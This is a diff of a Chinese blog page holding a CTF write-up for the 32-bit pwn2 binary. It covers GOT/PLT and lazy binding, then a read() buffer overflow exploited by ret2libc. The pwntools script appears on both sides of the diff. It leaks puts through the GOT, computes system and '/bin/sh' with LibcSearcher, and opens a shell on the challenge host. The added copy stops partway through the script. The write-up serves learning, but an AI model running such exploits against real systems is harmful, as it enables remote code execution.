@@ -418,31 +418,32 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h3 id="font-color-brown一-基础知识font"><a class="markdownIt-Anchor" href="#font-color-brown一-基础知识font"></a> <font color="brown">一、基础知识</font></h3>
-<h4 id="font-color-navy1got-表-plt-表和-libc-库的相关知识font"><a class="markdownIt-Anchor" href="#font-color-navy1got-表-plt-表和-libc-库的相关知识font"></a> <font color="navy">1.GOT 表、PLT 表和 libc 库的相关知识</font></h4>
-<p><font color="red">① 什么是 GOT 表？</font></p>
+        <h3 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a><font color="brown">一、基础知识</font></h3><h4 id="1-GOT-表、PLT-表和-libc-库的相关知识"><a href="#1-GOT-表、PLT-表和-libc-库的相关知识" class="headerlink" title="1.GOT 表、PLT 表和 libc 库的相关知识"></a><font color="navy">1.GOT 表、PLT 表和 libc 库的相关知识</font></h4><font color="red">① 什么是 GOT 表？</font>
+
 <blockquote>
 <p>GOT(Global Offset Table) 表，即<strong>全局偏移量表</strong>，里面是函数在 libc 库中的绝对地址。</p>
 </blockquote>
-<p><font color="red">② 什么是 PLT 表？</font></p>
+<font color="red">② 什么是 PLT 表？</font>
+
 <blockquote>
 <p>PLT(Procedure Link Table) 表，即<strong>程序链接表</strong>，里面是函数在 GOT 表中的地址。</p>
 </blockquote>
-<p><font color="red">③ 什么是 libc 库？</font></p>
+<font color="red">③ 什么是 libc 库？</font>
+
 <blockquote>
-<p><strong>libc是Linux下的ANSI C的函数库</strong>。ANSI C是基本的C语言函数库，包含了C语言最基本的<a href="https://baike.baidu.com/item/%E5%BA%93%E5%87%BD%E6%95%B0" target="_blank" rel="noopener">库函数</a>。这个库可以根据 头文件划分为 15 个部分，其中包括：字符类型 ()、<a href="https://baike.baidu.com/item/%E9%94%99%E8%AF%AF%E7%A0%81" target="_blank" rel="noopener">错误码</a>()、 浮点常数 ()、数学常数 ()、标准定义 ()、 标准 I/O ()、工具函数 ()、字符串操作 ()、 时间和日期 ()、可变参数表 ()、信号 ()、 非局部跳转 ()、本地信息 ()、程序断言 () 等等。这在其他的C语言的IDE中都是有的。（来源百度百科词条）</p>
+<p><strong>libc是Linux下的ANSI C的函数库</strong>。ANSI C是基本的C语言函数库，包含了C语言最基本的<a href="https://baike.baidu.com/item/库函数" target="_blank" rel="noopener">库函数</a>。这个库可以根据 头文件划分为 15 个部分，其中包括：字符类型 ()、<a href="https://baike.baidu.com/item/错误码" target="_blank" rel="noopener">错误码</a>()、 浮点常数 ()、数学常数 ()、标准定义 ()、 标准 I/O ()、工具函数 ()、字符串操作 ()、 时间和日期 ()、可变参数表 ()、信号 ()、 非局部跳转 ()、本地信息 ()、程序断言 () 等等。这在其他的C语言的IDE中都是有的。（来源百度百科词条）</p>
 </blockquote>
-<p><font color="red">④ GOT、PLT 和 libc 库的联系</font></p>
+<font color="red">④ GOT、PLT 和 libc 库的联系</font>
+
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_banner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to World of PLT and GOT\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fd = open(<span class="string">"/tmp/text"</span>,File);</span><br><span class="line">    write(fd,<span class="keyword">void</span> *buf,<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    print_banner();</span><br><span class="line">	write_file();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>如上图所示， write_file 函数，在该函数里面调用glibc的write实现写文件操作。根据前面讨论的PLT和GOT原理，假设上述的示例 test 在运行过程中，调用方（如 print_banner 和 write_file )是如何通过 PLT 和 GOT 穿针引线之后，最终调用到 glibc 的 printf 和 write 函数的？</p>
 <p><img src="/images/84-1.jpg" alt></p>
 </blockquote>
-<h4 id="font-color-navy2重定位font"><a class="markdownIt-Anchor" href="#font-color-navy2重定位font"></a> <font color="navy">2.重定位</font></h4>
-<blockquote>
-<p>重定位就是把程序的<a href="https://baike.baidu.com/item/%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4/5624042" target="_blank" rel="noopener">逻辑地址空间</a>变换成内存中的实际<a href="https://baike.baidu.com/item/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80/2129" target="_blank" rel="noopener">物理地址</a>空间的过程。它是实现<a href="https://baike.baidu.com/item/%E5%A4%9A%E9%81%93%E7%A8%8B%E5%BA%8F/8192392" target="_blank" rel="noopener">多道程序</a>在内存中同时运行的基础。重定位有两种，分别是<a href="https://baike.baidu.com/item/%E5%8A%A8%E6%80%81%E9%87%8D%E5%AE%9A%E4%BD%8D/9849090" target="_blank" rel="noopener">动态重定位</a>与<a href="https://baike.baidu.com/item/%E9%9D%99%E6%80%81%E9%87%8D%E5%AE%9A%E4%BD%8D/8785916" target="_blank" rel="noopener">静态重定位</a>。</p>
-<p>① <a href="https://baike.baidu.com/item/%E9%9D%99%E6%80%81%E9%87%8D%E5%AE%9A%E4%BD%8D" target="_blank" rel="noopener">静态重定位</a>：即在程序装入内存的过程中完成，是指在程序开始运行前，程序中的各个地址有关的项均已完成重定位，地址变换通常是在装入时一次完成的，以后不再改变，故成为静态重定位。</p>
-<p>② <a href="https://baike.baidu.com/item/%E5%8A%A8%E6%80%81%E9%87%8D%E5%AE%9A%E4%BD%8D" target="_blank" rel="noopener">动态重定位</a>：它不是在程序装入内存时完成的，而是CPU每次访问内存时 由<a href="https://baike.baidu.com/item/%E5%8A%A8%E6%80%81%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">动态地址</a>变换机构（硬件）自动进行把相对地址转换为<a href="https://baike.baidu.com/item/%E7%BB%9D%E5%AF%B9%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">绝对地址</a>。动态重定位需要软件和硬件相互配合完成。</p>
+<h4 id="2-重定位"><a href="#2-重定位" class="headerlink" title="2.重定位"></a><font color="navy">2.重定位</font></h4><blockquote>
+<p>重定位就是把程序的<a href="https://baike.baidu.com/item/逻辑地址空间/5624042" target="_blank" rel="noopener">逻辑地址空间</a>变换成内存中的实际<a href="https://baike.baidu.com/item/物理地址/2129" target="_blank" rel="noopener">物理地址</a>空间的过程。它是实现<a href="https://baike.baidu.com/item/多道程序/8192392" target="_blank" rel="noopener">多道程序</a>在内存中同时运行的基础。重定位有两种，分别是<a href="https://baike.baidu.com/item/动态重定位/9849090" target="_blank" rel="noopener">动态重定位</a>与<a href="https://baike.baidu.com/item/静态重定位/8785916" target="_blank" rel="noopener">静态重定位</a>。</p>
+<p>① <a href="https://baike.baidu.com/item/静态重定位" target="_blank" rel="noopener">静态重定位</a>：即在程序装入内存的过程中完成，是指在程序开始运行前，程序中的各个地址有关的项均已完成重定位，地址变换通常是在装入时一次完成的，以后不再改变，故成为静态重定位。</p>
+<p>② <a href="https://baike.baidu.com/item/动态重定位" target="_blank" rel="noopener">动态重定位</a>：它不是在程序装入内存时完成的，而是CPU每次访问内存时 由<a href="https://baike.baidu.com/item/动态地址" target="_blank" rel="noopener">动态地址</a>变换机构（硬件）自动进行把相对地址转换为<a href="https://baike.baidu.com/item/绝对地址" target="_blank" rel="noopener">绝对地址</a>。动态重定位需要软件和硬件相互配合完成。</p>
 <p>（以上来源百度百科词条）</p>
 <p>关于重定位的还有以下几篇文章：</p>
 <p><a href="https://blog.csdn.net/cherisegege/article/details/80708143" target="_blank" rel="noopener">① 什么是重定位？为什么需要重定位？</a> 强烈推荐看一下，因为通过这篇文章又引入了几个概念和问题：</p>
@@ -456,29 +457,29 @@ height:50vh;
 </blockquote>
 <p><a href="https://segmentfault.com/a/1190000016433947" target="_blank" rel="noopener">② 彻底理解链接器：四，重定位</a></p>
 </blockquote>
-<h3 id="font-color-navy3延迟绑定font"><a class="markdownIt-Anchor" href="#font-color-navy3延迟绑定font"></a> <font color="navy">3.延迟绑定</font></h3>
-<blockquote>
+<h3 id="3-延迟绑定"><a href="#3-延迟绑定" class="headerlink" title="3.延迟绑定"></a><font color="navy">3.延迟绑定</font></h3><blockquote>
 <p>关于延迟绑定的相关内容与动态链接有者密不可分的联系，我只简单地介绍一下延迟绑定的目的和实现原理。</p>
-<p><font color="red">① 延迟绑定的目的</font></p>
-<p>    第一次调用函数时，由连接器负责重定位，第二次调用函数时直接调用，不必经过连接器。</p>
-<p><font color="red">② 延迟绑定的实现原理</font></p>
-<p>    延迟绑定PLT（Procedure Linkage Table）在GOT表基础又做了一次间接跳转。即模块内关于外部函数的地址引用，这下并不直接通过GOT跳转，而是通过一个叫做PLT项的结构来进行，每个外部函数引用都对应PLT表中的一个表项，比如bar()函数在PLT表中的表项称为bar@plt，实现如下：</p>
+<font color="red">① 延迟绑定的目的</font>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;第一次调用函数时，由连接器负责重定位，第二次调用函数时直接调用，不必经过连接器。</p>
+<font color="red">② 延迟绑定的实现原理</font>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;延迟绑定PLT（Procedure Linkage Table）在GOT表基础又做了一次间接跳转。即模块内关于外部函数的地址引用，这下并不直接通过GOT跳转，而是通过一个叫做PLT项的结构来进行，每个外部函数引用都对应PLT表中的一个表项，比如bar()函数在PLT表中的表项称为bar@plt，实现如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; bar@plt:</span><br><span class="line">&gt; jmp    *(bar@GOT)</span><br><span class="line">&gt; push   n</span><br><span class="line">&gt; push   moduleID</span><br><span class="line">&gt; jump   _dl_runtime_resolve</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
 </blockquote>
+<p>&gt;</p>
 <blockquote>
-<p>    但所谓延迟绑定，即是指在初始未遇到bar()函数之前，GOT表中并无函数bar()的地址信息，而是将后续push n指令的地址填充到GOT中bar()表项中，这时jmp指令将会直接跳转继续执行后续的push n…等指令，该步操作很简单也不需要遍历寻址目标符号，故而代价很低，只需要在生成桩代码时将push n指令位置填入即可。而后的操作便是正常参数压栈工作，其中push n中的参数n对应的是bar()函数符号在重定位表.rel.plt中的下标，push moduleID中的moduleID则是模块ID，调用_dl_runtime_resolve函数完成具体的符号解析和重定位工作，将外部模块中bar()函数的真正地址填入GOT对应的bar@GOT表项。这样当我们下次再次回到PLT表bar@plt表项中转时，便会进入正常的函数调用过程，而不会继续执行push n及之后的代码，那段代码只会在符号未被解析时执行only一次。</p>
-<p><font color="red">更多关于延迟绑定和动态链接的文章如下：</font></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;但所谓延迟绑定，即是指在初始未遇到bar()函数之前，GOT表中并无函数bar()的地址信息，而是将后续push n指令的地址填充到GOT中bar()表项中，这时jmp指令将会直接跳转继续执行后续的push n…等指令，该步操作很简单也不需要遍历寻址目标符号，故而代价很低，只需要在生成桩代码时将push n指令位置填入即可。而后的操作便是正常参数压栈工作，其中push n中的参数n对应的是bar()函数符号在重定位表.rel.plt中的下标，push moduleID中的moduleID则是模块ID，调用_dl_runtime_resolve函数完成具体的符号解析和重定位工作，将外部模块中bar()函数的真正地址填入GOT对应的bar@GOT表项。这样当我们下次再次回到PLT表bar@plt表项中转时，便会进入正常的函数调用过程，而不会继续执行push n及之后的代码，那段代码只会在符号未被解析时执行only一次。</p>
+<font color="red">更多关于延迟绑定和动态链接的文章如下：</font>
+
 <p><a href="https://blog.csdn.net/roger_ranger/article/details/78903976" target="_blank" rel="noopener">① Linux动态链接之二：优化加速之延迟绑定PLT</a></p>
 <p><a href="https://baijiahao.baidu.com/s?id=1627680279509045317&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">② 延迟绑定的实现</a></p>
 </blockquote>
-<h3 id="font-color-brown二-解题思路font"><a class="markdownIt-Anchor" href="#font-color-brown二-解题思路font"></a> <font color="brown">二、解题思路</font></h3>
-<h4 id="font-color-navy1file-pwn2font"><a class="markdownIt-Anchor" href="#font-color-navy1file-pwn2font"></a> <font color="navy">1.file pwn2</font></h4>
-<p><img src="/images/84-2.jpg" alt></p>
+<h3 id="二、解题思路"><a href="#二、解题思路" class="headerlink" title="二、解题思路"></a><font color="brown">二、解题思路</font></h3><h4 id="1-file-pwn2"><a href="#1-file-pwn2" class="headerlink" title="1.file pwn2"></a><font color="navy">1.file pwn2</font></h4><p><img src="/images/84-2.jpg" alt></p>
 <blockquote>
 <p>从上面得到的信息是：<code>pwn2 是一个 32 位 可执行的 ELF 文件，并且是动态连接的</code></p>
 </blockquote>
-<h3 id="font-color-navy2check-pwn2font"><a class="markdownIt-Anchor" href="#font-color-navy2check-pwn2font"></a> <font color="navy">2.check pwn2</font></h3>
-<p><img src="/images/84-3.jpg" alt></p>
+<h3 id="2-check-pwn2"><a href="#2-check-pwn2" class="headerlink" title="2.check pwn2"></a><font color="navy">2.check pwn2</font></h3><p><img src="/images/84-3.jpg" alt></p>
 <blockquote>
 <p>从上面可以得到的信息是：</p>
 <ul>
@@ -487,59 +488,53 @@ height:50vh;
 <li>我们对 GOT 表具有写的权限（RELRO:    Partial RELRO）</li>
 </ul>
 </blockquote>
-<h4 id="font-color-navy3ida-反编译-pwn2font"><a class="markdownIt-Anchor" href="#font-color-navy3ida-反编译-pwn2font"></a> <font color="navy">3.IDA 反编译 pwn2</font></h4>
-<blockquote>
-<p><font color="red">① 查找漏洞</font></p>
+<h4 id="3-IDA-反编译-pwn2"><a href="#3-IDA-反编译-pwn2" class="headerlink" title="3.IDA 反编译 pwn2"></a><font color="navy">3.IDA 反编译 pwn2</font></h4><blockquote>
+<font color="red">① 查找漏洞</font>
+
 <p>通过 IDA 对 pwn2 的处理后，我们可以在函数 <code>sub_80484EA()</code> 中看到可能出现的漏洞——<code>read() 函数</code></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">ssize_t</span> sub_80484EA()</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt; <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-58h]@1</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="built_in">puts</span>(<span class="string">"welcome to ROP world"</span>);</span><br><span class="line">&gt; <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0xC8</span>u);</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
 </blockquote>
+<p>&gt;</p>
 <blockquote>
 <p>我们可以通过简单的计算：</p>
-<p>     ☛ buf 缓冲区可以读入的数据有：0xC8u（十进制为：200个字节）</p>
-<p>     ☛ 但是 buf 离 ebp 的距离有：0x58h（十进制为：88）</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;☛ buf 缓冲区可以读入的数据有：0xC8u（十进制为：200个字节）</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;☛ 但是 buf 离 ebp 的距离有：0x58h（十进制为：88）</p>
 <p>所以我们输入的数据大小超过了 buf 的实际空间大小，如下图所示：</p>
 <p><img src="/images/84-4.png" alt></p>
-<p><font color="red">② 查找 system() 和 /bin/sh </font></p>
-<p>通过在 IDA 里面查找，我们没有找到 system() 和 \bin\sh 那我们必须通过另外一个思路想办法获得 system() 和 /bin/sh：我们可以通过 <code>ROPgadget</code> 命令来查找 <code>system()</code> 和 <code>/bin/sh</code></p>
-<center>ROPgadget --binary pwn2 --string 'system'</center>
-但是并没有找到该字符：
+<font color="red">② 查找 system() 和 /bin/sh </font>
+
+<p>通过在 IDA 里面查找，我们没有找到 system() 和 \\bin\\sh 那我们必须通过另外一个思路想办法获得 system() 和 /bin/sh：我们可以通过 <code>ROPgadget</code> 命令来查找 <code>system()</code> 和 <code>/bin/sh</code></p>
+<p><center>ROPgadget --binary pwn2 --string 'system'</center><br>但是并没有找到该字符：</p>
 <p><img src="/images/84-8.jpg" alt></p>
 </blockquote>
-<h3 id="font-color-navy4解题思路font"><a class="markdownIt-Anchor" href="#font-color-navy4解题思路font"></a> <font color="navy">4.解题思路</font></h3>
-<blockquote>
+<h3 id="4-解题思路"><a href="#4-解题思路" class="headerlink" title="4.解题思路"></a><font color="navy">4.解题思路</font></h3><blockquote>
 <p>通过我们对文件 <code>pwn2</code> 进行分析后，我们没有发现 system() 和/bin/sh，那么我们该怎么得到这两个的地址呢？</p>
-<p><font color="red">① 查看 pwn2 用到的库</font></p>
+<font color="red">① 查看 pwn2 用到的库</font>
+
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; ldd pwn2</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
 </blockquote>
+<p>&gt;</p>
 <blockquote>
 <p><img src="/images/84-4.jpg" alt></p>
 <p>从上面的得到的信息可以看出，文件 <code>pwn2</code> 中用到的库有 <code>linux-gate.so.1</code> 、<code>libc.so.6</code>、<code>ld-linux.so.2</code>，下面我们来看看这三个库中有什么？</p>
-<p>    ☛ <code>linux-gate.so.1</code>：这个所谓的&quot;linux-gate.so.1&quot;的内容就是内核映射的代码，系统中其实并不存在这样一个链接库文件，它的名字是由ldd自己起的，而在老版本的ldd中，虽然能够检测到这段代码，但是由于没有命名而且在系统中找不到对应链接库文件，所以会有一些显示上的问题。</p>
-<p>    ☛ <code>libc.so.6</code>：我们通过查看<code>libc.so.6</code>库，可以看到这个库包含了 <code>pwn2</code> 程序中出现的<code>puts()函数</code>，以及我们想找的 <code>system()</code>函数以及<code>/bin/sh</code></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;☛ <code>linux-gate.so.1</code>：这个所谓的”linux-gate.so.1”的内容就是内核映射的代码，系统中其实并不存在这样一个链接库文件，它的名字是由ldd自己起的，而在老版本的ldd中，虽然能够检测到这段代码，但是由于没有命名而且在系统中找不到对应链接库文件，所以会有一些显示上的问题。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;☛ <code>libc.so.6</code>：我们通过查看<code>libc.so.6</code>库，可以看到这个库包含了 <code>pwn2</code> 程序中出现的<code>puts()函数</code>，以及我们想找的 <code>system()</code>函数以及<code>/bin/sh</code></p>
 <p><img src="/images/84-5.jpg" alt></p>
 <p><img src="/images/84-6.jpg" alt></p>
-<p>    ☛ <code>ld-linux.so.2</code>：这是glibc的库文件，一般链接到相应版本的ld-xxx.so上，我没有具体的查看封装的函数。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;☛ <code>ld-linux.so.2</code>：这是glibc的库文件，一般链接到相应版本的ld-xxx.so上，我没有具体的查看封装的函数。</p>
 <p><br>下面的是我们计算机中有的库：</p>
 <p><img src="/images/84-7.jpg" alt></p>
 <p><br><font color="red">② 获得 system 和 /bin/sh 的地址</font></p>
-<p>    我们可以利用<strong>重定位</strong>，来泄露 <code>puts()</code> 函数的 got 表，以及通过puts() 函数在 libc.so.6 中的偏移地址，来得到 libc  的<strong>基地址</strong>。</p>
-<p>    我们通过得到的基地址，再通过获取 <code>system()</code> 和 <code>/bin/sh</code> 的偏移地址，我们就可以得到 <code>system()</code> 和 <code>/bin/sh</code> 的实际地址。</p>
-<p>    <font color="navy">libcbase = puts_addr - libc.dump(‘puts’)</font><br>
-    <font color="navy">system_addr = libcbase + libc.dump(‘system’)</font><br>
-    <font color="navy">binsh_addr = libcbase + libc.dump(‘str_bin_sh’)</font></p>
-<p>    我们可以通过 <a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">LicSearcher</a> 根据 <code>puts()</code> 函数的版本，来查找 <code>puts()</code> 、<code>system()</code> 和 <code>/bin/sh</code>的偏移</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;我们可以利用<strong>重定位</strong>，来泄露 <code>puts()</code> 函数的 got 表，以及通过puts() 函数在 libc.so.6 中的偏移地址，来得到 libc  的<strong>基地址</strong>。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;我们通过得到的基地址，再通过获取 <code>system()</code> 和 <code>/bin/sh</code> 的偏移地址，我们就可以得到 <code>system()</code> 和 <code>/bin/sh</code> 的实际地址。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;<font color="navy">libcbase = puts_addr - libc.dump(‘puts’)</font><br>&nbsp;&nbsp;&nbsp;&nbsp;<font color="navy">system_addr = libcbase + libc.dump(‘system’)</font><br>&nbsp;&nbsp;&nbsp;&nbsp;<font color="navy">binsh_addr = libcbase + libc.dump(‘str_bin_sh’)</font></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;我们可以通过 <a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">LicSearcher</a> 根据 <code>puts()</code> 函数的版本，来查找 <code>puts()</code> 、<code>system()</code> 和 <code>/bin/sh</code>的偏移</p>
 </blockquote>
-<h3 id="font-color-brown三-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-brown三-解题步骤font"></a> <font color="brown">三、解题步骤</font></h3>
-<h4 id="font-color-navy1编写脚本font"><a class="markdownIt-Anchor" href="#font-color-navy1编写脚本font"></a> <font color="navy">1.编写脚本</font></h4>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">pwn2 = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">r = remote(<span class="string">'vps1.blue-whale.me'</span>,<span class="number">9991</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get the address of "puts"</span></span><br><span class="line"></span><br><span class="line">puts_got = pwn2.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = pwn2.plt[<span class="string">'puts'</span>]</span><br><span class="line">main = <span class="number">0x08048519</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># First payload (the function is to get address of puts)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">92</span> + p32(puts_plt) + p32(main) + p32(puts_got)</span><br><span class="line">r.recvuntil(<span class="string">"welcome to ROP world\n"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">puts_addr = u32(r.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"put_address:"</span> + hex(puts_addr)</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_got:'</span> + hex(puts_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_plt:'</span> + hex(puts_plt)</span><br><span class="line"><span class="comment">#print libc.dump("system")</span></span><br><span class="line"><span class="comment">#print libc.dump("str_bin_sh")</span></span><br><span class="line"><span class="comment">#print libc.dump("_libc_start_main")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#According the address of offset in libc, we can gain the address of system and binsh</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc.dump(puts):"</span> + hex(libc.dump(<span class="string">'puts'</span>))</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"-----------------------------------get_shell----------------------------------"</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">92</span> + p32(system_addr) + <span class="string">'a'</span>*<span class="number">4</span> + p32(binsh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<h4 id="font-color-navy2执行脚本font"><a class="markdownIt-Anchor" href="#font-color-navy2执行脚本font"></a> <font color="navy">2.执行脚本</font></h4>
-<p><img src="/images/84-10.jpg" alt></p>
-<h4 id="font-color-navy3查看当前目录下的文件夹font"><a class="markdownIt-Anchor" href="#font-color-navy3查看当前目录下的文件夹font"></a> <font color="navy">3.查看当前目录下的文件夹</font></h4>
-<p><img src="/images/84-11.jpg" alt></p>
-<h4 id="font-color-navy4获取-flagfont"><a class="markdownIt-Anchor" href="#font-color-navy4获取-flagfont"></a> <font color="navy">4.获取 flag</font></h4>
-<p><img src="/images/84-12.jpg" alt></p>
-<h3 id="font-color-brown四-参考文章font"><a class="markdownIt-Anchor" href="#font-color-brown四-参考文章font"></a> <font color="brown">四、参考文章</font></h3>
-<ul>
+<h3 id="三、解题步骤"><a href="#三、解题步骤" class="headerlink" title="三、解题步骤"></a><font color="brown">三、解题步骤</font></h3><h4 id="1-编写脚本"><a href="#1-编写脚本" class="headerlink" title="1.编写脚本"></a><font color="navy">1.编写脚本</font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">pwn2 = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">r = remote(<span class="string">'vps1.blue-whale.me'</span>,<span class="number">9991</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get the address of "puts"</span></span><br><span class="line"></span><br><span class="line">puts_got = pwn2.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = pwn2.plt[<span class="string">'puts'</span>]</span><br><span class="line">main = <span class="number">0x08048519</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># First payload (the function is to get address of puts)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">92</span> + p32(puts_plt) + p32(main) + p32(puts_got)</span><br><span class="line">r.recvuntil(<span class="string">"welcome to ROP world\n"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">puts_addr = u32(r.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"put_address:"</span> + hex(puts_addr)</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_got:'</span> + hex(puts_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_plt:'</span> + hex(puts_plt)</span><br><span class="line"><span class="comment">#print libc.dump("system")</span></span><br><span class="line"><span class="comment">#print libc.dump("str_bin_sh")</span></span><br><span class="line"><span class="comment">#print libc.dump("_libc_start_main")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#According the address of offset in libc, we can gain the address of system and binsh</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc.dump(puts):"</span> + 